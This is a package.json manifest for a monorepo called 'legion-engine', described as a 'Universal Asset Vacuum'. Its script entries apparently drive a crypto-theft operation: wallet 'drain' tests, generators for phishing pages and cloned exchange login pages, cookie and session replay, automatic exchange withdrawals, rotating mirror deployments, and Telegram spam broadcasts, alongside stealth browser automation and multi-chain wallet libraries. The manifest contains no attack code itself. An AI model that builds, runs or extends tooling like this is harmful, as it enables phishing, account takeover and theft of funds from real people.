{
  "name": "legion-engine",
  "version": "0.1.0",
  "private": true,
  "description": "Universal Asset Vacuum — multi-sentinel, API-first, frontend-agnostic backend",
  "engines": {
    "node": ">=20.0.0",
    "pnpm": ">=9.0.0"
  },
  "packageManager": "pnpm@9.15.9",
  "scripts": {
    "dev": "node scripts/dev.js",
    "dev:dashboard": "pnpm --filter @legion/dashboard dev",
    "dev:vault": "pnpm --filter @legion/sovereign-admin dev",
    "build:clean": "node scripts/clean-pnpm-locks.mjs",
    "build:workspace": "pnpm -r --sort --workspace-concurrency=1 --filter \"./packages/*\" build && pnpm -r --sort --workspace-concurrency=1 --filter \"./apps/*\" build",
    "build": "pnpm --filter @legion/core build && pnpm --filter @legion/api build",
    "build:all": "pnpm run build:clean && pnpm --filter @legion/core build && pnpm -r --sort --workspace-concurrency=1 --filter \"./packages/*\" --filter \"!@legion/core\" build && pnpm -r --sort --workspace-concurrency=1 --filter \"./apps/*\" build",
    "lint": "eslint . --ext .ts,.tsx",
    "typecheck": "tsc --noEmit",
    "test": "vitest run",
    "test:parse-envelope": "node scripts/test-parse-envelope.mjs",
    "test:5chain-live": "node scripts/test-5chain-live.mjs",
    "db:migrate": "pnpm --filter @legion/core db:migrate",
    "db:generate": "pnpm --filter @legion/core db:generate",
    "omni-audit": "tsx scripts/omni-audit.ts",
    "final-audit": "tsx scripts/final-audit-report.ts",
    "health": "node --env-file=.env --env-file=.env.development --import tsx scripts/health-check.ts",
    "check-railway": "tsx scripts/check-railway-env.ts",
    "print-wallets": "tsx --env-file=.env scripts/print-execution-wallets.ts",
    "wallet-guide": "tsx --env-file=.env scripts/fund-wallets-guide.ts",
    "live-audit": "node --env-file=.env --env-file=.env.development --import tsx scripts/live-audit.ts",
    "test-drain": "tsx --env-file=.env scripts/e2e-test-drain.ts",
    "test-omnichain": "tsx --env-file=.env scripts/e2e-test-omnichain.ts",
    "build:check": "pnpm -r exec tsc --noEmit --skipLibCheck false > compiler-errors.txt 2>&1",
    "setup": "tsx scripts/setup-wizard.ts",
    "mirror:build": "pnpm --filter @legion/mirror build",
    "mirror:health": "pnpm --filter @legion/mirror start:health",
    "mirror:rotate": "pnpm --filter @legion/mirror start:rotator",
    "mirror:deploy": "tsx --env-file=.env scripts/deploy-mirror.ts",
    "generate-clone": "tsx scripts/generate-phishing-page.ts",
    "clone-tunnel": "tsx --env-file=.env scripts/clone-deploy-tunnel.ts",
    "install-extension": "tsx --env-file=.env scripts/install-extension.ts",
    "cex-clone": "tsx scripts/generate-cex-login-page.ts",
    "cex-cookie-replay": "tsx --env-file=.env scripts/cex-cookie-replay.ts",
    "session-replay": "tsx --env-file=.env scripts/session-replay.ts",
    "cex-auto-withdraw": "tsx --env-file=.env scripts/cex-auto-withdraw.ts",
    "test-full-workflow": "tsx --env-file=.env scripts/test-full-workflow.ts",
    "tg-broadcast": "tsx --env-file=.env scripts/telegram-broadcast.ts",
    "traffic": "tsx --env-file=.env scripts/telegram-broadcast.ts",
    "traffic-spam": "tsx --env-file=.env scripts/telegram-broadcast.ts",
    "build:dashboard": "pnpm --filter @legion/dashboard build"
  },
  "devDependencies": {
    "@gatesolve/puppeteer-plugin": "^0.2.1",
    "@inquirer/prompts": "^7.10.1",
    "@legion/core": "workspace:*",
    "@scure/base": "^2.2.0",
    "@solana/web3.js": "^1.95.4",
    "@ton/core": "^0.62.0",
    "@ton/crypto": "^3.3.0",
    "@ton/ton": "^15.1.0",
    "@types/node": "^20.0.0",
    "@types/pg": "^8.20.0",
    "bitcoinjs-lib": "^7.0.0",
    "bs58": "^6.0.0",
    "bullmq": "^5.34.5",
    "eslint": "^8.57.0",
    "ioredis": "^5.4.1",
    "pg": "^8.20.0",
    "prettier": "^3.3.0",
    "puppeteer": "^23.11.1",
    "puppeteer-extra": "^3.3.6",
    "puppeteer-extra-plugin-stealth": "^2.11.2",
    "tiny-secp256k1": "^2.2.4",
    "tronweb": "^6.0.0",
    "tsx": "^4.21.0",
    "typescript": "^5.4.0",
    "viem": "2.21.0",
    "vitest": "^1.6.0"
  },
  "pnpm": {
    "overrides": {
      "wagmi": "2.12.0",
      "viem": "2.21.0",
      "@wagmi/core": "2.13.0",
      "@wagmi/connectors": "5.1.0"
    }
  }
}
